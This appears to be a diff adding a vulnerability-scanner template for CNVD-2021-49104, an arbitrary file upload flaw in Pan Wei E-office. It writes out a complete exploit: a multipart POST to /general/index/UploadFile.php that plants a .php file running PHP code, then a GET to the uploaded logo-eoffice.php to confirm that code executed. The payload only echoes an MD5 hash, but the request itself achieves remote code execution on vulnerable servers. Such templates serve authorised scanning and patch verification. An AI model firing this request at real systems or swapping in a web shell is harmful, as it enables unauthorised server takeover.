@@ -1,0 +1,45 @@
+## id: CNVD-2021-49104
+## name: Pan Micro E-office File Uploads
+## author: hack007x
+## severity: critical
+## tags: cnvd2021,cnvd,pan,micro,fileupload,intrusive,vuln
+## description: The Pan Wei Micro E-office version running allows arbitrary file uploads from a remote attacker.
+## affects: Pan Wei has released an update to resolve this vulnerability.
+## cvss-score: 9.9
+## reference: https://chowdera.com/2021/12/202112200602130067.html
+## reference: http://v10.e-office.cn
+## verification: true
+
+#$ string = {{random_str(8)}}
+POST /general/index/UploadFile.php?m=uploadPicture&uploadType=eoffice_logo&userId= HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+Content-Type: multipart/form-data; boundary=e64bdf16c554bbc109cecef6451c26a4
+
+--e64bdf16c554bbc109cecef6451c26a4
+Content-Disposition: form-data; name="Filedata"; filename="{{random_str(8)}}.php"
+Content-Type: image/jpeg
+
+<?php echo md5("{{string}}");?>
+
+--e64bdf16c554bbc109cecef6451c26a4--
+
+
+#@ matcher: status_code == 200
+
+---
+
+GET /images/logo/logo-eoffice.php HTTP/1.1
+Host: {{Hostname}}
+User-Agent: {{random_ua}}
+
+#@ condition: and
+#@ matcher: body contains "{{md5(string)}}"
+#@ matcher: body contains "94d01a2324ce38a2e29a629c54190f67"
+#@ matcher: status_code == 200
+
+
+
+
+
+# @VEIL-STAMP: fc3f7dfb27bb2d7e3795c123eaa2a082e6d47ee6a5a5fa276e9c69098cea26de
